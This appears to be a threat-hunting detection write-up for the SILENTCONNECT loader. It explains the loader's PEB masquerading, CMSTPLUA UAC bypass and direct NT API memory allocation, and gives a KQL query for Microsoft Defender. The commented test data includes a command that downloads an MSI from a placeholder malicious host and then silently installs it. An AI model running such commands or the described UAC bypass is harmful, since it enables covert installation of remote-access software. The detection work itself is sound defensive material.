# Name
SILENTCONNECT Advanced Evasion Techniques and Privilege Escalation

# Description
This detection suite focuses on additional, advanced Indicators of Compromise (IOCs) and Tactics, Techniques, and Procedures (TTPs) utilized by the SILENTCONNECT loader that were highlighted in the Elastic Security Labs report.
SILENTCONNECT employs several sophisticated mechanisms to evade defenses and elevate privileges before silently installing ScreenConnect:
PEB Masquerading: The malware alters its Process Environment Block (PEB) module list, changing its BaseDLLName and FullDllName to winhlp32.exe and c:\windows\winhlp32.exe to trick Endpoint Detection and Response (EDR) sensors.
UAC Bypass: If running in an un-elevated state, it uses the CMSTPLUA COM interface (LaunchElevatedCOMObjectUnsafe) with an obfuscated, reversed elevation moniker (:wen!rotartsinimdA:noitavelE) to bypass User Account Control. This typically results in dllhost.exe (the COM Surrogate) spawning the elevated payload.
Direct NT API Calls & Memory Allocation: The malware uses NtAllocateVirtualMemory directly from ntdll.dll to allocate PAGE_EXECUTE_READWRITE memory for its shellcode, bypassing higher-level, easily hooked Windows APIs.

# References
- https://www.elastic.co/security-labs/silentconnect-delivers-screenconnect

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- SILENTCONNECT (Multi-stage Loader)

# MITRE ATT&CK
- T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- T1036.004: Masquerading: Masquerade Task or Service (PEB Masquerading)
- T1055: Process Injection (NtAllocateVirtualMemory)
- T1106: Native API

# Data Sources
- Microsoft Defender XDR / Microsoft Sentinel
   - DeviceProcessEvents

# Query
## Query 1 - SILENTCONNECT PEB Masquerading (Anomalous winhlp32.exe Activity)
This query detects instances where processes claim to be the legacy Windows Help application (winhlp32.exe), but exhibit behavior completely uncharacteristic of the legitimate binary—such as making network connections, acting as a parent to scripting engines, or spawning installer processes. This is a direct indicator of SILENTCONNECT's PEB masquerading module.

```kql
// let DeviceProcessEvents = datatable(
//     Timestamp: datetime,
//     DeviceName: string,
//     ActionType: string,
//     FileName: string,
//     ProcessCommandLine: string,
//     AccountName: string,
//     InitiatingProcessFileName: string,
//     InitiatingProcessCommandLine: string
// )
// [
//     // Case 1: SILENTCONNECT masquerading as winhlp32.exe spawning PowerShell
//     datetime(2026-03-27 10:00:00), "Workstation01", "ProcessCreated", "powershell.exe", "powershell.exe -c \"curl.exe 'https://malicious/...' -o 'C:\\Temp\\ScreenConnect.ClientSetup.msi'\"", "SYSTEM", "winhlp32.exe", "winhlp32.exe",
//     // Case 2: SILENTCONNECT masquerading as winhlp32.exe spawning msiexec
//     datetime(2026-03-27 10:05:00), "Workstation02", "ProcessCreated", "msiexec.exe", "msiexec.exe /i C:\\Temp\\ScreenConnect.ClientSetup.msi /qn", "SYSTEM", "winhlp32.exe", "winhlp32.exe",
//     // Case 3: Legitimate legacy help execution (rare, but shouldn't spawn shells)
//     datetime(2026-03-27 10:10:00), "Workstation03", "ProcessCreated", "winhlp32.exe", "winhlp32.exe legacy_app.hlp", "jdoe", "explorer.exe", "explorer.exe"
// ];
DeviceProcessEvents
| where Timestamp > ago(14d)
| where ActionType == "ProcessCreated"
// Look for processes spawned by the masqueraded binary, or the binary itself running anomalous commands
| where InitiatingProcessFileName =~ "winhlp32.exe" or FileName =~ "winhlp32.exe"
| where FileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe", "msiexec.exe", "curl.exe")
    or InitiatingProcessFileName in~ ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe")
| project Timestamp, DeviceName, AccountName, ActionType, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
```
